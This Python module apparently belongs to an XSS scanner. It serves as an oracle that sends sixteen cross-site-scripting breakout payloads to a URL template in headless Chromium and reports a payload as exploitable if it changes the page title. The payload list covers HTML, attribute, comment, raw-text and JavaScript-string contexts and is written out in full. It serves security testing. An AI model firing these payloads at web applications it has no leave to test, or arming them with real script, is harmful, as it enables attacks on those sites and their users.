#!/usr/bin/env python3

"""
Ground truth oracle: decides whether a reflection sink is *really* exploitable
by firing real breakout payloads at it inside headless Chromium.

Every payload sets ``document.title`` to a fixed marker (no quotes, no spaces,
so it survives unquoted HTML attributes and naive escapers). If the marker
shows up in the rendered DOM, script execution actually happened.
"""

import os
import shutil
import subprocess
import tempfile
import threading
import urllib.parse

MARK = "document.title=987654321"
MARKER = "<title>987654321</title>"                                                    # only a *mutated* title proves execution;
                                                                            # the payload text itself is not enough

BREAKOUTS = tuple(_ % MARK for _ in (
    "<svg onload=%s >",                                                     # straight into HTML text
    "1<svg onload=%s >",                                                    # ...for sinks that require a numeric prefix
    "'><svg onload=%s >",                                                   # out of a single quoted attribute
    '"><svg onload=%s >',                                                   # out of a double quoted attribute
    "><svg onload=%s >",                                                    # out of an unquoted attribute
    "1' autofocus onfocus=%s '",                                            # new attribute, single quoted value
    '1" autofocus onfocus=%s "',                                            # new attribute, double quoted value
    "1 autofocus onfocus=%s ",                                              # new attribute after an unquoted value
    "1 oncontentvisibilityautostatechange=%s style=content-visibility:auto ",
    "--><svg onload=%s >",                                                  # out of an HTML comment
    "</textarea></title></style></script><svg onload=%s >",                 # out of any raw text element
    "1;%s;//",                                                              # unquoted JavaScript
    "1';%s;//",                                                             # out of a single quoted JavaScript string
    '1";%s;//',                                                             # out of a double quoted JavaScript string
    "1`;%s;//",                                                             # out of a template literal
    "${%s}",                                                                # template literal interpolation
))

_BINARY = next(filter(None, (shutil.which(_) for _ in ("chromium", "chromium-browser", "google-chrome", "google-chrome-stable"))), None)

# snap-packaged Chromium may only write inside its own confinement directory
_PROFILE_ROOT = next((_ for _ in (os.path.expanduser("~/snap/chromium/common"),) if os.path.isdir(_)), tempfile.gettempdir())

_local = threading.local()


def available():
    return _BINARY is not None


def _profile():
    if not getattr(_local, "profile", None):
        _local.profile = tempfile.mkdtemp(prefix="dsxs-oracle-", dir=_PROFILE_ROOT)
    return _local.profile


def render(url, timeout=60, attempts=3):
    """Returns the DOM of `url` after scripts had their chance to run.

    Chromium occasionally refuses to start (profile lock, sandbox hiccup) and
    then prints nothing at all; that is retried with a fresh profile so the
    oracle never reports a launch failure as "not exploitable".
    """

    for attempt in range(attempts):
        try:
            process = subprocess.run([_BINARY, "--headless=new", "--disable-gpu", "--no-sandbox", "--no-first-run",
                                      "--disable-extensions", "--disable-background-networking", "--no-default-browser-check",
                                      "--user-data-dir=%s" % _profile(), "--virtual-time-budget=2000", "--dump-dom", url],
                                     stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=timeout)
            dom = process.stdout.decode("utf-8", "replace")
        except subprocess.TimeoutExpired:
            dom = ""
        if "</html>" in dom:
            return dom
        _local.profile = None                                               # forces a clean profile on the next try
    raise RuntimeError("headless browser produced no DOM for %r after %d attempts" % (url, attempts))


def exploitable(template):
    """`template` must contain a single %s placeholder for the payload.

    Returns the first payload that achieved script execution, or None.
    """

    for payload in BREAKOUTS:
        if MARKER in render(template % urllib.parse.quote(payload, safe="")):
            return payload
    return None
